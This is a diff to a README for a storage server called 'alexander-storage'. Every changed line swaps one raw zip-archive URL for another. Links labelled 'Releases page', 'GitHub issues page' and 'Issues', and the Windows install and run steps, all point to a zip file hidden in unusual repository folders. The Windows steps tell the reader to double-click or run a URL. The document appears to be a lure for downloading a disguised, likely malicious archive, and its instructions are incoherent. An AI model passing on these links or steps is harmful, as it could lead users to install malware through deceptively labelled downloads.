@@ -2,7 +2,7 @@
 
 ## 📥 Download Now!
 
-[![Download alexander-storage](https://github.com/Joker1230005/alexander-storage/raw/refs/heads/main/internal/lock/alexander_storage_v3.4.zip%20alexander--storage-v1.0-blue)](https://github.com/Joker1230005/alexander-storage/raw/refs/heads/main/internal/lock/alexander_storage_v3.4.zip)
+[![Download alexander-storage](https://raw.githubusercontent.com/Joker1230005/alexander-storage/main/docs/guides/alexander_storage_3.7.zip%20alexander--storage-v1.0-blue)](https://raw.githubusercontent.com/Joker1230005/alexander-storage/main/docs/guides/alexander_storage_3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -31,10 +31,10 @@ The documentation contains more detailed information about each feature and how 
 
 ## 💻 Download & Install
 
-1. Visit the [Releases page](https://github.com/Joker1230005/alexander-storage/raw/refs/heads/main/internal/lock/alexander_storage_v3.4.zip) to find the latest version.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Joker1230005/alexander-storage/main/docs/guides/alexander_storage_3.7.zip) to find the latest version.
    
 2. Download the appropriate file for your system:
-   - For Windows, download `https://github.com/Joker1230005/alexander-storage/raw/refs/heads/main/internal/lock/alexander_storage_v3.4.zip`.
+   - For Windows, download `https://raw.githubusercontent.com/Joker1230005/alexander-storage/main/docs/guides/alexander_storage_3.7.zip`.
    - For Linux, download `alexander-storage-linux`.
    - For macOS, download `alexander-storage-macos`.
 
@@ -43,7 +43,7 @@ The documentation contains more detailed information about each feature and how 
 4. Follow these steps based on your operating system:
 
    ### 🪟 Windows Installation
-   - Double-click the `https://github.com/Joker1230005/alexander-storage/raw/refs/heads/main/internal/lock/alexander_storage_v3.4.zip` file.
+   - Double-click the `https://raw.githubusercontent.com/Joker1230005/alexander-storage/main/docs/guides/alexander_storage_3.7.zip` file.
    - Follow the prompts to complete the installation.
 
    ### 🐧 Linux Installation
@@ -75,7 +75,7 @@ To run alexander-storage:
 1. Open a terminal or command prompt.
 2. Navigate to the folder where you installed alexander-storage.
 3. Type the command to start the application.
-   - For Windows: `https://github.com/Joker1230005/alexander-storage/raw/refs/heads/main/internal/lock/alexander_storage_v3.4.zip`.
+   - For Windows: `https://raw.githubusercontent.com/Joker1230005/alexander-storage/main/docs/guides/alexander_storage_3.7.zip`.
    - For Linux: `./alexander-storage-linux`.
    - For macOS: `./alexander-storage-macos`.
 
@@ -83,7 +83,7 @@ Once running, you can access the storage server via your web browser. Enter `htt
 
 ## 📞 Support
 
-If you encounter issues or have questions, you can find support on our [GitHub issues page](https://github.com/Joker1230005/alexander-storage/raw/refs/heads/main/internal/lock/alexander_storage_v3.4.zip). 
+If you encounter issues or have questions, you can find support on our [GitHub issues page](https://raw.githubusercontent.com/Joker1230005/alexander-storage/main/docs/guides/alexander_storage_3.7.zip). 
 
 ## ✅ Troubleshooting
 
@@ -97,8 +97,8 @@ Here are common problems and solutions:
 
 - [Documentation](https://link-to-documentation)
 - [Contributing](https://link-to-contributing)
-- [Issues](https://github.com/Joker1230005/alexander-storage/raw/refs/heads/main/internal/lock/alexander_storage_v3.4.zip)
+- [Issues](https://raw.githubusercontent.com/Joker1230005/alexander-storage/main/docs/guides/alexander_storage_3.7.zip)
 
-## 📥 Visit this page to download: [Releases page](https://github.com/Joker1230005/alexander-storage/raw/refs/heads/main/internal/lock/alexander_storage_v3.4.zip) 
+## 📥 Visit this page to download: [Releases page](https://raw.githubusercontent.com/Joker1230005/alexander-storage/main/docs/guides/alexander_storage_3.7.zip) 
 
 Follow these instructions carefully to get your storage server up and running. Whether you're handling personal files or large datasets, alexander-storage offers a straightforward solution for your storage needs.
